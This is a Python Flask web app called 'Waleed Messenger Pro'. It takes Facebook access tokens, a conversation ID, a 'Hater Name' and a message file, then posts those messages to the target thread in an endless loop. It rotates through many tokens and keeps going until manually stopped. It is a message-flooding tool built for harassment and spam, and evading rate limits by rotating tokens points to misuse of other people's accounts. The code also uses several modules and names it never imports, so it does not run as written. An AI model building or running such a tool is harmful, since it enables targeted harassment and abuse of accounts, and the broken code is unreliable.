from flask import Flask, request, jsonify
import requests
import json

app = Flask(__name__)
app.debug = True
app.secret_key = os.urandom(24)  # For session management

tasks = {}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Function to generate random task id
def generate_random_id(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Background function to send messages
def send_messages(task_id, token_type, access_token, thread_id, messages, mn, time_interval, tokens=None):
    tasks[task_id] = {'running': True}

    token_index = 0
    while tasks[task_id]['running']:
        for message1 in messages:
            if not tasks[task_id]['running']:
                break
            try:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                if token_type == 'single':
                    current_token = access_token
                else:
                    current_token = tokens[token_index]
                    token_index = (token_index + 1) % len(tokens)

                parameters = {'access_token': current_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)

                if response.status_code == 200:
                    print(Fore.GREEN + f"Message sent using token {current_token}: {message}")
                else:
                    print(Fore.RED + f"Failed to send message using token {current_token}: {message}")

                time.sleep(time_interval)
            except Exception as e:
                print(Fore.GREEN + f"Error while sending message using token {current_token}: {message}")
                print(e)
                time.sleep(30)

    print(Fore.YELLOW + f"Task {task_id} stopped.")

@app.route('/', methods=['GET', 'POST'])
def index():
    # Set default theme if not set
    if 'theme' not in session:
        session['theme'] = 'dark-blue'
    
    if request.method == 'POST':
        token_type = request.form.get('tokenType')
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if token_type == 'multi':
            token_file = request.files['tokenFile']
            tokens = token_file.read().decode().splitlines()
        else:
            tokens = None

        # Generate random task id
        task_id = generate_random_id()

        # Start the background thread
        thread = threading.Thread(target=send_messages, args=(task_id, token_type, access_token, thread_id, messages, mn, time_interval, tokens))
        thread.start()

        return jsonify({'task_id': task_id})

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Waleed Messenger Pro</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary-color: #4a6fa5;
      --secondary-color: #166088;
      --accent-color: #4cb1ff;
      --text-color: #f8f9fa;
      --bg-color: #1a1a2e;
      --card-bg: #16213e;
      --input-bg: #0f3460;
      --border-color: #4cb1ff;
    }
    
    .theme-dark-blue {
      --primary-color: #4a6fa5;
      --secondary-color: #166088;
      --accent-color: #4cb1ff;
      --text-color: #f8f9fa;
      --bg-color: #1a1a2e;
      --card-bg: #16213e;
      --input-bg: #0f3460;
      --border-color: #4cb1ff;
    }
    
    .theme-midnight-purple {
      --primary-color: #6a3093;
      --secondary-color: #a044ff;
      --accent-color: #c850c0;
      --text-color: #f8f9fa;
      --bg-color: #1f1d36;
      --card-bg: #3f3351;
      --input-bg: #2c2b3c;
      --border-color: #c850c0;
    }
    
    .theme-emerald-green {
      --primary-color: #0a7e4f;
      --secondary-color: #13aa6d;
      --accent-color: #00ff9d;
      --text-color: #f8f9fa;
      --bg-color: #0d2818;
      --card-bg: #1b4332;
      --input-bg: #2d6a4f;
      --border-color: #00ff9d;
    }
    
    .theme-crimson-red {
      --primary-color: #9d0208;
      --secondary-color: #d00000;
      --accent-color: #ff6b6b;
      --text-color: #f8f9fa;
      --bg-color: #2b2d42;
      --card-bg: #3d0000;
      --input-bg: #6a040f;
      --border-color: #ff6b6b;
    }
    
    body {
      background-color: var(--bg-color);
      color: var(--text-color);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      transition: all 0.3s ease;
    }
    
    .container {
      max-width: 500px;
      background-color: var(--card-bg);
      border-radius: 15px;
      padding: 25px;
      margin: 0 auto;
      margin-top: 20px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border-color);
    }
    
    .header {
      text-align: center;
      padding-bottom: 15px;
      margin-bottom: 20px;
      border-bottom: 2px solid var(--accent-color);
    }
    
    .header h1 {
      font-weight: 700;
      font-size: 2.2rem;
      background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
    }
    
    .form-control, .form-select {
      background-color: var(--input-bg);
      color: var(--text-color);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      padding: 10px 15px;
    }
    
    .form-control:focus, .form-select:focus {
      background-color: var(--input-bg);
      color: var(--text-color);
      border-color: var(--accent-color);
      box-shadow: 0 0 0 0.25rem rgba(76, 177, 255, 0.25);
    }
    
    .btn-primary {
      background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
      border: none;
      border-radius: 8px;
      padding: 12px;
      font-weight: 600;
      transition: all 0.3s ease;
    }
    
    .btn-primary:hover {
      background: linear-gradient(45deg, var(--secondary-color), var(--accent-color));
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }
    
    .btn-danger {
      background: linear-gradient(45deg, #dc3545, #c82333);
      border: none;
      border-radius: 8px;
      padding: 12px;
      font-weight: 600;
      transition: all 0.3s ease;
    }
    
    .btn-danger:hover {
      background: linear-gradient(45deg, #c82333, #a71e2a);
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }
    
    label {
      font-weight: 500;
      margin-bottom: 8px;
      color: var(--accent-color);
    }
    
    .theme-selector {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
      gap: 10px;
    }
    
    .theme-btn {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      border: 2px solid #fff;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    
    .theme-btn:hover {
      transform: scale(1.1);
    }
    
    .theme-btn.dark-blue {
      background: linear-gradient(45deg, #4a6fa5, #4cb1ff);
    }
    
    .theme-btn.midnight-purple {
      background: linear-gradient(45deg, #6a3093, #c850c0);
    }
    
    .theme-btn.emerald-green {
      background: linear-gradient(45deg, #0a7e4f, #00ff9d);
    }
    
    .theme-btn.crimson-red {
      background: linear-gradient(45deg, #9d0208, #ff6b6b);
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      padding: 15px;
      font-size: 0.9rem;
      color: var(--accent-color);
      border-top: 1px solid var(--border-color);
    }
    
    .task-status {
      background-color: var(--input-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 20px;
      display: none;
    }
    
    .logo {
      font-size: 2.5rem;
      margin-bottom: 10px;
      color: var(--accent-color);
    }
  </style>
</head>
<body>
  <div class="theme-selector">
    <div class="theme-btn dark-blue" data-theme="dark-blue"></div>
    <div class="theme-btn midnight-purple" data-theme="midnight-purple"></div>
    <div class="theme-btn emerald-green" data-theme="emerald-green"></div>
    <div class="theme-btn crimson-red" data-theme="crimson-red"></div>
  </div>

  <header class="header">
    <div class="logo">
      <i class="fas fa-paper-plane"></i>
    </div>
    <h1>Waleed Messenger Pro</h1>
    <p>Ultimate Message Sending Solution</p>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data" id="mainForm">
      <div class="mb-3">
        <label for="tokenType"><i class="fas fa-key"></i> Select Token Type:</label>
        <select class="form-control" id="tokenType" name="tokenType" required>
          <option value="single">Single Token</option>
          <option value="multi">Multi Token</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenField">
        <label for="accessToken"><i class="fas fa-token"></i> Enter Your Token:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken">
      </div>
      <div class="mb-3">
        <label for="threadId"><i class="fas fa-comments"></i> Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx"><i class="fas fa-signature"></i> Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile"><i class="fas fa-file-lines"></i> Select Your Message File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3" id="multiTokenFile" style="display: none;">
        <label for="tokenFile"><i class="fas fa-file-code"></i> Select Token File (for multi-token):</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
      </div>
      <div class="mb-3">
        <label for="time"><i class="fas fa-gauge-high"></i> Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" min="1" value="2" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">
        <i class="fas fa-play-circle"></i> Start Task
      </button>
    </form>
    
    <div class="task-status" id="taskStatus">
      <h5><i class="fas fa-spinner fa-spin"></i> Task Running</h5>
      <p>Task ID: <span id="currentTaskId"></span></p>
      <p>Status: <span class="text-success">Active</span></p>
    </div>
  </div>

  <div class="container mt-4">
    <h3><i class="fas fa-stop-circle"></i> Stop Task</h3>
    <form action="/stop_task" method="post" id="stopForm">
      <div class="mb-3">
        <label for="taskId">Enter Task ID:</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit">
        <i class="fas fa-stop"></i> Stop Task
      </button>
    </form>
  </div>

  <footer class="footer">
    <p>&copy; 2025 Waleed Messenger Pro. Developed with <i class="fas fa-heart text-danger"></i> by Apovel</p>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // Handle token type change
      document.getElementById('tokenType').addEventListener('change', function() {
        var tokenType = this.value;
        document.getElementById('multiTokenFile').style.display = tokenType === 'multi' ? 'block' : 'none';
        document.getElementById('singleTokenField').style.display = tokenType === 'multi' ? 'none' : 'block';
      });
      
      // Theme switcher
      const themeButtons = document.querySelectorAll('.theme-btn');
      themeButtons.forEach(btn => {
        btn.addEventListener('click', function() {
          const theme = this.getAttribute('data-theme');
          document.body.className = 'theme-' + theme;
          // Store theme in session
          fetch('/set_theme?theme=' + theme);
        });
      });
      
      // Apply saved theme
      document.body.className = 'theme-{{ session.theme }}';
      
      // Form submission with AJAX
      document.getElementById('mainForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const formData = new FormData(this);
        
        fetch('/', {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(data => {
          document.getElementById('currentTaskId').textContent = data.task_id;
          document.getElementById('taskStatus').style.display = 'block';
          
          // Scroll to task status
          document.getElementById('taskStatus').scrollIntoView({ behavior: 'smooth' });
        })
        .catch(error => {
          console.error('Error:', error);
        });
      });
      
      // Stop form submission with AJAX
      document.getElementById('stopForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const formData = new FormData(this);
        
        fetch('/stop_task', {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(data => {
          if (data.status === 'stopped') {
            alert('Task ' + data.task_id + ' has been stopped successfully!');
          } else {
            alert('Task not found! Please check the Task ID.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
        });
      });
    });
  </script>
</body>
</html>
''', theme=session.get('theme', 'dark-blue'))

@app.route('/set_theme')
def set_theme():
    theme = request.args.get('theme', 'dark-blue')
    session['theme'] = theme
    return jsonify({'status': 'success', 'theme': theme})

@app.route('/stop_task', methods=['POST'])
def stop_task():
    """Stop a running task based on the task ID."""
    task_id = request.form.get('taskId')
    if task_id in tasks:
        tasks[task_id]['running'] = False
        return jsonify({'status': 'stopped', 'task_id': task_id})
    return jsonify({'status': 'not found', 'task_id': task_id}), 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))

    app.run(host='0.0.0.0', port=port, debug=True)

